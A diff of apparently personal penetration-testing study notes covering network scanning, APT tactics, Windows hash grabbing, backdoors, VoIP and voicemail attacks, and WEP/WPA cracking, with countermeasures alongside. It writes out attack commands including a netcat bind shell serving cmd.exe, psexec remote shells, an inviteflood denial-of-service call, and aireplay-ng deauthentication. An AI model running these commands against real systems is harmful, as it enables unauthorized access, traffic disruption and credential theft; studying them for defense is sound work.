@@ -8,14 +8,14 @@ Scanning vs. enumeration
 - ICMP remote host/router -> ping, **NMAP**, Hping3, superscan
 - TCP/UDP host discovery -> **NMAP**, superscan, Hping3   
 So basically just use **nmap**.
-> nmap -sL 100.100.1.1-254 # search host alive *nmbotto de casino fa eh rumore*.  
-> nmap -sS -sV <ip> # find services and version   
+```nmap -sL 100.100.1.1-254 # search host alive *nmbotto de casino fa eh rumore*```.  
+```nmap -sS -sV <ip> # find services and version  ``` 
 nmap not only send an ICMP ECHO REQUEST it also perform an ARP ping. (attenction to IPS).
 
 - Banner grabbing 
 
 ## DNS enumeration
-> nslookup, ls -d, <domain name>; or dig  
+```nslookup, ls -d, <domain name>```; or dig  
 + norecurse, examines only the local dns data. ANSWER: 0 <- EXAMPLE. If i run again the command ANSWER:1. So we can see if someone has queried the site. And we also know the ip af a domain.
 
 # APT (Advanced Persisten Threats)
@@ -25,7 +25,7 @@ Example
 - RBN
 
 Uses of advanced methods (0day, custom exploit) to attack. Are persistent because the attack stop after long time and threats because are organized, motivated etc.
-Non APT attacks are against targets of opportunity. APT -> Long-term goals, used to steal a large amount of data in a long time. APT goal **Obtain and mantain access to information**. APT attack don't destroy system or interrupt normal operation. Techniques: dropper delivery services, SQL injection to add malware to wesites, infected USB stik "**drops**" infected HW or SW, social engineering, impersonating users. Hide file (linux file name '.. '), RAM drives "sudo mount -t ramfs -o size=512M ramfs /tmp/ram/", to see ram drives use "df -a".
+Non APT attacks are against targets of opportunity. APT -> Long-term goals, used to steal a large amount of data in a long time. APT goal **Obtain and mantain access to information**. APT attack don't destroy system or interrupt normal operation. Techniques: dropper delivery services, SQL injection to add malware to wesites, infected USB stik "**drops**" infected HW or SW, social engineering, impersonating users. Hide file (linux file name '.. '), RAM drives ```sudo mount -t ramfs -o size=512M ramfs /tmp/ram/```, to see ram drives use ```df -a```.
 
 ## APT methods of attack
 1. Spear-phishing email
@@ -108,23 +108,23 @@ Privilege escalation (SISTEM is MORE powerful os ADMIN account). Preventing Priv
 
 ### Grabbing Password Hashesssssss
 Local user in windows security accounts manager (SAM) under NT4 and earlier. SAM == SHADOW files for windows.  
-Stored in %systemroot%\system32\config\SAM but **it's locked as long as the OS is running**. It's also in the Registry key HKEY_LOCAL_MACHINE\SAM. How to get hashes? Easy, use **CAIN** (cracker tab-> right click-> add to list). **Cain inject a DLL (shared libraries) into a hight privilege process in a running system. Other way to get the hashes, boot target system to an alternate OS and copy SAM file. 
+Stored in ```%systemroot%\system32\config\SAM``` but **it's locked as long as the OS is running**. It's also in the Registry key ```HKEY_LOCAL_MACHINE\SAM```. How to get hashes? Easy, use **CAIN** (cracker tab-> right click-> add to list). **Cain inject a DLL (shared libraries) into a hight privilege process** in a running system. Other way to get the hashes, boot target system to an alternate OS and copy SAM file. 
 
 ### Cracking hash
-NTLM hard to break but earlier version (XP an before) still use LM (wheak). **Windows doesn't salt its hash!** pffff. SO speed up password cracking with raimbow tables
+NTLM hard to break but earlier version (XP an before) still use LM (wheak). **Windows doesn't salt its hash!** pffff. So speed up password cracking with raimbow tables
 
 ### Backdoors
 
-> psexec \\10.1.1.1 -u Administrator -password -s cmd.exe  
-> or  
-> nc -l -e cmd.exe -p 8080 #ez rekt  
-> telnet <ip> 8080 # attacker  
+```psexec \\10.1.1.1 -u Administrator -password -s cmd.exe  ```
+or  
+```nc -l -e cmd.exe -p 8080 #ez rekt ``` 
+```telnet <ip> 8080 # attacker  ```
  
  ### hide file
  - attrib +h filename (set hidden bit)
  - alterbate data stream (ADS)
- > echo 'robe' > out.txt  
- > echo 'segreto' > out.txt:hidden.txt
+ ```echo 'robe' > out.txt ```   
+ ```echo 'segreto' > out.txt:hidden.txt```  
 
  same size.  
  Best way to hide file -> Rootkits
@@ -137,8 +137,8 @@ known dangerous filename like nc.exe, run antivirus, use tripwire or other tools
 changes to system files. 
 ### Suspicius registry entries
 Look for regisry keys that start known backdoors like:
- - HKEY_USERS\.DEFAULT\Software\ORL\WINVNC3
- - HKEY_LOCAL_MACHINE\SOFTWARE\Net Solutions\NetBus Server
+ - ```HKEY_USERS\.DEFAULT\Software\ORL\WINVNC3```
+ - ```HKEY_LOCAL_MACHINE\SOFTWARE\Net Solutions\NetBus Server```
 **use reg delete to remove**
 **Backdor favourite autostart (extensibility points (ASEPs))**
  - **HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**
@@ -166,7 +166,7 @@ footprinting: identify blocks of phone to load into a wardialer.
 ## Voicemail Hacking
 Brute-force Voicemail Hacking. In similar fashion to dial-up hacking methods. Required components: phone number to access voicemail; target voicemail box (3~5 digits); educated guess about voicemail box password (typically only numbers)
 
-**TOOLS**: Voicemail Box Hacker 3.0 and VrACK 0.51 (for old/less-secure system), ASPECT scripting language.
+**TOOLS**: ```Voicemail Box Hacker 3.0``` and ```VrACK 0.51``` (for old/less-secure system), ASPECT scripting language.
 
 **COUNTERMEASURES**: deploy a lockout on failed attempts; log/observe voicemail connections
 
@@ -194,9 +194,9 @@ IKE Phase 1-Aggressive mode does not provide a secure channel (Eavesdropping att
  **COUNTERMEASURES**: discontinue IKE Aggressive mode use; use token-based authentication scheme.
 
 ### VoIP Attacks
-- **VoIP Enumeration** provide detail and owerview of the setup: VoIP gateway/server, IP-PBK system, client software(softphone)/VoIP phone and user extension [command to do this: svmap.py <IP-RANGE-TO-SCAN>(search phone/PBX) and svwar.py -e<RANGE-EXTENSION> <IP-TO_SCAN> -m INVITE (search extension)]. 
+- **VoIP Enumeration** provide detail and owerview of the setup: VoIP gateway/server, IP-PBK system, client software(softphone)/VoIP phone and user extension [command to do this: ```svmap.py <IP-RANGE-TO-SCAN>(search phone/PBX) and svwar.py -e<RANGE-EXTENSION> <IP-TO_SCAN> -m INVITE (search extension)```]. 
 
-- **With DOS** we can attack a sigle phone or multiple phone. To perform this attack we just must send a large colume of fake call (SIP INVITE) to the victim or flooding the phone with unwanted traffic (COMMAND: inviteflood <INTERFACE> <USER(EXTENSION)> <TARGET-DOMAIN> <IP-TARGET> <NUM_OP_PACKET>, and the phone continusly ring now).
+- **With DOS** we can attack a sigle phone or multiple phone. To perform this attack we just must send a large colume of fake call (SIP INVITE) to the victim or flooding the phone with unwanted traffic (COMMAND:``` inviteflood <INTERFACE> <USER(EXTENSION)> <TARGET-DOMAIN> <IP-TARGET> <NUM_OP_PACKET>```, and the phone continusly ring now).
 
 - **Interceprion attacks**: sniff VoIP datastream with wireshark or make an arpSpoofing attack with dsniff to capture the RTP stream. Than we must recognize the codec of the datasream and than convert datastream to popular file types (TOOLS: scapy or vomit) 
 
@@ -250,9 +250,9 @@ Because **RC4** is a **stream cipher**, the **same traffic key must never be use
 
 ### ATTACK WEP 
 1. card in monitor mode
-1. airodump-ng wlan0 (to searck a network with wep)
-1. airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write test-ap-dump wlan0 (to sniff and store the traffic of that network in the file test-ap-dump)
-1. airckrack-ng test-ap-dump-01.cap
+1. ```airodump-ng wlan0``` (to searck a network with wep)
+1. ```airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write test-ap-dump wlan0``` (to sniff and store the traffic of that network in the file test-ap-dump)
+1. ```airckrack-ng test-ap-dump-01.cap```
 1. wait 
 
 #### COUNTERMEASURE WEP DON'T USE WEP EVER
@@ -272,13 +272,13 @@ The only packets that contains information that can help us to determine the key
 
 ### ATTACK WPA-PSK
 1. capturing the handshake 
-    - airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write test-handshake wlan0
+    - ```airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write test-handshake wlan0```
 
 1. if we dont find any handshake we can cause them with deauth attack
-    - aireplay-ng --deauth 4 -a xx:xx:xx:xx:xx:xx<AP MAC> -c xx:xx:xx:xx:xx:xx<MAC CLIENT DEAUTH> wlan0
+    - ```aireplay-ng --deauth 4 -a xx:xx:xx:xx:xx:xx<AP MAC> -c xx:xx:xx:xx:xx:xx<MAC CLIENT DEAUTH> wlan0```
 
 1. crack the key with dictionary
-    - aircrack-ng test-handshake-01.cap -w wordlist
+    - ```aircrack-ng test-handshake-01.cap -w wordlist```
 
 
 ### WPA-Enterprise
@@ -321,7 +321,7 @@ EAP-TTLS and PEAP both use a TLS tunnel to protect a less secure inner authentic
     - IF SSID broadcasting is off, just deauthenticate all to force reassociation.
 - MAC address control (Each MAC must be entered into the list of approved addresses)
     - Sniff for users search for the mac of one user and spoof
-    - >macchanger -m xx:xx:xx:xx:xx:xx [interface]
+    - ```macchanger -m xx:xx:xx:xx:xx:xx [interface]```
 
 
 ## Summary wireless hacking
